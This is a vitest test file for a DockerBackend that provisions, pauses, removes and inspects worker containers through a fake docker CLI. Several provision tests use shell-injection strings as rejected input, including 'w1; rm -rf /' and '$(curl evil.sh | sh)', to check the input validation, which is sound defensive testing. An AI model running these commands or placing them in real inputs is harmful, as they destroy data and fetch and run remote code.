import { describe, it, expect } from "vitest";
import { DockerBackend } from "../docker";
import type { CommandRunner } from "../singularity";
import type { ExecResult } from "../ssh";
import { RemoteBackendRegistry } from "../backend";
import type { RemoteSpec } from "../backend";
import { ScaleToZeroManager } from "../scale-to-zero";

interface FakeContainer {
  id: string;
  name: string;
  image: string;
  status: string; // docker inspect status vocabulary
  args: string[];
  stdout: string;
  stderr: string;
}

/**
 * FAKE-TRANSPORT test double: simulates just enough of the `docker` CLI's
 * argv contract (run/inspect/pause/unpause/rm/logs/version) to exercise
 * DockerBackend without ever invoking a real Docker daemon.
 */
function fakeDockerRunner(opts: { versionOk?: boolean } = {}): CommandRunner & {
  calls: Array<{ bin: string; args: string[] }>;
  containers: Map<string, FakeContainer>;
  nextId: () => string;
} {
  const calls: Array<{ bin: string; args: string[] }> = [];
  const containers = new Map<string, FakeContainer>();
  let counter = 0;
  const versionOk = opts.versionOk ?? true;

  function findByNativeIdOrName(ref: string): FakeContainer | undefined {
    return containers.get(ref) ?? [...containers.values()].find((c) => c.name === ref);
  }

  return {
    calls,
    containers,
    nextId: () => `c${++counter}${"a".repeat(58)}`.slice(0, 64),
    async run(bin: string, args: string[]): Promise<ExecResult> {
      calls.push({ bin, args });
      const [cmd] = args;

      if (cmd === "version") {
        return versionOk ? { stdout: "27.3.1\n", stderr: "", code: 0 } : { stdout: "", stderr: "cannot connect to the Docker daemon", code: 1 };
      }

      if (cmd === "run") {
        const nameIdx = args.indexOf("--name");
        const name = args[nameIdx + 1];
        const image = args[args.length - 1];
        const id = `c${++counter}`.padEnd(64, "0");
        containers.set(id, { id, name, image, status: "running", args, stdout: "", stderr: "" });
        return { stdout: `${id}\n`, stderr: "", code: 0 };
      }

      if (cmd === "inspect") {
        const ref = args[args.length - 1];
        const c = findByNativeIdOrName(ref);
        if (!c) return { stdout: "", stderr: `Error: No such object: ${ref}`, code: 1 };
        return { stdout: `${c.status}\n`, stderr: "", code: 0 };
      }

      if (cmd === "pause") {
        const ref = args[args.length - 1];
        const c = findByNativeIdOrName(ref);
        if (!c) return { stdout: "", stderr: `Error response from daemon: No such container: ${ref}`, code: 1 };
        c.status = "paused";
        return { stdout: `${ref}\n`, stderr: "", code: 0 };
      }

      if (cmd === "unpause") {
        const ref = args[args.length - 1];
        const c = findByNativeIdOrName(ref);
        if (!c) return { stdout: "", stderr: `Error response from daemon: No such container: ${ref}`, code: 1 };
        c.status = "running";
        return { stdout: `${ref}\n`, stderr: "", code: 0 };
      }

      if (cmd === "rm") {
        const ref = args[args.length - 1];
        const c = findByNativeIdOrName(ref);
        if (!c) return { stdout: "", stderr: `Error response from daemon: No such container: ${ref}`, code: 1 };
        containers.delete(c.id);
        return { stdout: `${ref}\n`, stderr: "", code: 0 };
      }

      if (cmd === "logs") {
        const ref = args[args.length - 1];
        const c = findByNativeIdOrName(ref);
        if (!c) return { stdout: "", stderr: `Error: No such container: ${ref}`, code: 1 };
        return { stdout: c.stdout, stderr: c.stderr, code: 0 };
      }

      return { stdout: "", stderr: `unrecognized command ${cmd}`, code: 127 };
    },
  };
}

function baseSpec(overrides: Partial<RemoteSpec> = {}): RemoteSpec {
  return {
    workerId: "w1",
    capabilities: ["search", "code"],
    managerUrl: "http://mgr.local",
    authToken: "secret-token",
    image: "hades/worker:latest",
    ...overrides,
  };
}

describe("DockerBackend — isAvailable / probe caching", () => {
  it("probes `docker version` and reports true on success", async () => {
    const runner = fakeDockerRunner({ versionOk: true });
    const be = new DockerBackend({ runner });
    expect(await be.isAvailable()).toBe(true);
    expect(runner.calls[0]).toEqual({ bin: "docker", args: ["version", "--format", "{{.Server.Version}}"] });
  });

  it("reports false on any probe error", async () => {
    const runner = fakeDockerRunner({ versionOk: false });
    const be = new DockerBackend({ runner });
    expect(await be.isAvailable()).toBe(false);
  });

  it("reports false when the runner throws", async () => {
    const runner: CommandRunner = {
      async run() {
        throw new Error("ENOENT: docker not found");
      },
    };
    const be = new DockerBackend({ runner });
    expect(await be.isAvailable()).toBe(false);
  });

  it("caches the probe result for probeTtlMs on an injected clock", async () => {
    let t = 0;
    const runner = fakeDockerRunner({ versionOk: true });
    const be = new DockerBackend({ runner, now: () => t, probeTtlMs: 1000 });

    await be.isAvailable();
    await be.isAvailable();
    expect(runner.calls.filter((c) => c.args[0] === "version")).toHaveLength(1); // second call was cached

    t = 999;
    await be.isAvailable();
    expect(runner.calls.filter((c) => c.args[0] === "version")).toHaveLength(1); // still within TTL

    t = 1000;
    await be.isAvailable();
    expect(runner.calls.filter((c) => c.args[0] === "version")).toHaveLength(2); // TTL expired, re-probed
  });

  it("defaults probeTtlMs to 30_000ms", async () => {
    let t = 0;
    const runner = fakeDockerRunner({ versionOk: true });
    const be = new DockerBackend({ runner, now: () => t });
    await be.isAvailable();
    t = 29_999;
    await be.isAvailable();
    expect(runner.calls.filter((c) => c.args[0] === "version")).toHaveLength(1);
    t = 30_000;
    await be.isAvailable();
    expect(runner.calls.filter((c) => c.args[0] === "version")).toHaveLength(2);
  });
});

describe("DockerBackend — provision", () => {
  it("runs `docker run -d --name hades-<workerId> ... <image>` and returns the trimmed container id", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner, now: () => 55 });
    const h = await be.provision(baseSpec({ limits: { cpus: 2, memory: "512m" } }));

    const runCall = runner.calls.find((c) => c.args[0] === "run")!;
    expect(runCall.args[0]).toBe("run");
    expect(runCall.args[1]).toBe("-d");
    expect(runCall.args.slice(2, 4)).toEqual(["--name", "hades-w1"]);
    expect(runCall.args).toContain("--cpus");
    expect(runCall.args[runCall.args.indexOf("--cpus") + 1]).toBe("2");
    expect(runCall.args).toContain("--memory");
    expect(runCall.args[runCall.args.indexOf("--memory") + 1]).toBe("512m");
    expect(runCall.args[runCall.args.length - 1]).toBe("hades/worker:latest");

    expect(h.backend).toBe("docker");
    expect(h.state).toBe("running");
    expect(h.startedAt).toBe(55);
    expect(h.nativeId).not.toContain("\n");
    expect(h.nativeId.length).toBeGreaterThan(0);
  });

  it("omits --cpus/--memory when limits are not given", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    await be.provision(baseSpec());
    const runCall = runner.calls.find((c) => c.args[0] === "run")!;
    expect(runCall.args).not.toContain("--cpus");
    expect(runCall.args).not.toContain("--memory");
  });

  it("maps SWARM_* env via -e flags, matching the other backends' derived keys", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    await be.provision(baseSpec({ model: "claude-x" }));
    const runCall = runner.calls.find((c) => c.args[0] === "run")!;
    expect(runCall.args).toContain("-e");
    expect(runCall.args).toContain("SWARM_WORKER_ID=w1");
    expect(runCall.args).toContain("SWARM_MANAGER_URL=http://mgr.local");
    expect(runCall.args).toContain("SWARM_AUTH_TOKEN=secret-token");
    expect(runCall.args).toContain("SWARM_CAPABILITIES=search,code");
    expect(runCall.args).toContain("SWARM_MODEL=claude-x");
  });

  it("documented precedence: spec.env overrides derived SWARM_* keys on collision", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    await be.provision(baseSpec({ env: { SWARM_CAPABILITIES: "overridden", EXTRA: "1" } }));
    const runCall = runner.calls.find((c) => c.args[0] === "run")!;
    expect(runCall.args).toContain("SWARM_CAPABILITIES=overridden");
    expect(runCall.args).not.toContain("SWARM_CAPABILITIES=search,code");
    expect(runCall.args).toContain("EXTRA=1");
  });

  it("falls back to defaultImage when spec.image is absent", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner, defaultImage: "hades/default:1" });
    await be.provision(baseSpec({ image: undefined }));
    const runCall = runner.calls.find((c) => c.args[0] === "run")!;
    expect(runCall.args[runCall.args.length - 1]).toBe("hades/default:1");
  });

  it("throws when no image is available at all", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    await expect(be.provision(baseSpec({ image: undefined }))).rejects.toThrow(/requires an image/);
  });

  it("throws with the daemon's stderr surfaced when `docker run` fails (non-zero exit)", async () => {
    const runner: CommandRunner = {
      async run(_bin, args) {
        if (args[0] === "run") return { stdout: "", stderr: "Error: no such image", code: 125 };
        return { stdout: "", stderr: "", code: 0 };
      },
    };
    const be = new DockerBackend({ runner });
    await expect(be.provision(baseSpec())).rejects.toThrow(/no such image/);
  });

  it("rejects a malicious workerId before building any argv", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    await expect(be.provision(baseSpec({ workerId: "w1; rm -rf /" }))).rejects.toThrow(/unsafe workerId/);
    expect(runner.calls).toHaveLength(0);
  });

  it("rejects a malicious image reference before building any argv", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    await expect(be.provision(baseSpec({ image: "$(curl evil.sh | sh)" }))).rejects.toThrow(/unsafe image/);
    expect(runner.calls).toHaveLength(0);
  });

  it("rejects workerId/image containing spaces or shell metacharacters", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    for (const bad of ["`whoami`", "a && b", "a|b", "a>b", "a b"]) {
      await expect(be.provision(baseSpec({ workerId: bad }))).rejects.toThrow(/unsafe workerId/);
    }
    expect(runner.calls).toHaveLength(0);
  });

  it("accepts a workerId/image with the allowed character set (alnum, dot, underscore, colon, slash, dash)", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec({ workerId: "w1.test_2:a/b-c", image: "registry.io/org/img:1.2.3" }));
    expect(h.workerId).toBe("w1.test_2:a/b-c");
  });
});

describe("DockerBackend — hibernate / wake (pause / unpause)", () => {
  it("hibernate runs `docker pause <id>` and reports state hibernated", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    const hibernated = await be.hibernate(h);
    expect(runner.calls.some((c) => c.args[0] === "pause" && c.args[1] === h.nativeId)).toBe(true);
    expect(hibernated.state).toBe("hibernated");
  });

  it("wake runs `docker unpause <id>` and reports state running", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    await be.hibernate(h);
    const woken = await be.wake(h);
    expect(runner.calls.some((c) => c.args[0] === "unpause" && c.args[1] === h.nativeId)).toBe(true);
    expect(woken.state).toBe("running");
  });

  it("hibernate throws with the daemon's stderr when pause fails", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    await be.terminate(h); // container now gone
    await expect(be.hibernate(h)).rejects.toThrow(/No such container/);
  });

  it("wake throws with the daemon's stderr when unpause fails", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    await be.terminate(h);
    await expect(be.wake(h)).rejects.toThrow(/No such container/);
  });
});

describe("DockerBackend — terminate (docker rm -f)", () => {
  it("removes the container", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    await be.terminate(h);
    expect(runner.containers.has(h.nativeId)).toBe(false);
  });

  it("is idempotent: terminating an already-gone container ('No such container') does not throw", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    await be.terminate(h);
    await expect(be.terminate(h)).resolves.toBeUndefined();
  });

  it("throws on an unrelated rm failure", async () => {
    const runner: CommandRunner = {
      async run(_bin, args) {
        if (args[0] === "rm") return { stdout: "", stderr: "permission denied", code: 1 };
        return { stdout: "id\n", stderr: "", code: 0 };
      },
    };
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    await expect(be.terminate(h)).rejects.toThrow(/permission denied/);
  });
});

describe("DockerBackend — status mapping (exhaustive)", () => {
  const table: Array<[string, string]> = [
    ["running", "running"],
    ["paused", "hibernated"],
    ["created", "provisioning"],
    ["exited", "stopped"],
    ["dead", "stopped"],
    ["removing", "stopped"],
    ["restarting", "failed"], // unknown docker status string → failed
    ["", "failed"],
  ];

  for (const [dockerStatus, expected] of table) {
    it(`maps inspect status "${dockerStatus}" -> "${expected}"`, async () => {
      const runner = fakeDockerRunner();
      const be = new DockerBackend({ runner });
      const h = await be.provision(baseSpec());
      runner.containers.get(h.nativeId)!.status = dockerStatus;
      expect(await be.status(h)).toBe(expected);
    });
  }

  it("maps an inspect CLI error (non-zero exit) to 'failed'", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    await be.terminate(h); // container gone -> inspect errors
    expect(await be.status(h)).toBe("failed");
  });
});

describe("DockerBackend — logs", () => {
  it("tails with the requested line count and merges stderr into stdout", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    const c = runner.containers.get(h.nativeId)!;
    c.stdout = "line1\nline2\n";
    c.stderr = "warn: something\n";

    await be.logs(h, 50);
    const logsCall = runner.calls.find((call) => call.args[0] === "logs")!;
    expect(logsCall.args).toEqual(["logs", "--tail", "50", h.nativeId]);

    const merged = await be.logs(h);
    expect(merged).toContain("line1");
    expect(merged).toContain("warn: something");
  });

  it("defaults tailLines to 100", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    await be.logs(h);
    const logsCall = runner.calls.find((call) => call.args[0] === "logs")!;
    expect(logsCall.args).toEqual(["logs", "--tail", "100", h.nativeId]);
  });

  it("returns stdout unmodified when stderr is empty", async () => {
    const runner = fakeDockerRunner();
    const be = new DockerBackend({ runner });
    const h = await be.provision(baseSpec());
    runner.containers.get(h.nativeId)!.stdout = "clean output\n";
    expect(await be.logs(h)).toBe("clean output\n");
  });
});

describe("DockerBackend — RemoteBackendRegistry / ScaleToZeroManager interop", () => {
  it("registers, provisions, and the scale-to-zero sweep hibernates via docker pause on an injected clock", async () => {
    let t = 0;
    const runner = fakeDockerRunner();
    const registry = new RemoteBackendRegistry();
    const be = new DockerBackend({ runner, now: () => t });
    registry.register(be);

    const { handle } = await registry.provision(baseSpec({ workerId: "sweep-me" }), "docker");
    expect(handle.backend).toBe("docker");

    const mgr = new ScaleToZeroManager(registry, { idleMs: 1000, now: () => t });
    mgr.markActive("sweep-me");

    t = 3000;
    const hibernated = await mgr.sweep();

    expect(hibernated).toEqual(["sweep-me"]);
    expect(runner.containers.get(handle.nativeId)!.status).toBe("paused");
    expect(await registry.status("sweep-me")).toBe("hibernated");

    t = 3500;
    const woken = await mgr.acquire("sweep-me");
    expect(woken?.state).toBe("running");
    expect(runner.containers.get(handle.nativeId)!.status).toBe("running");
  });
});
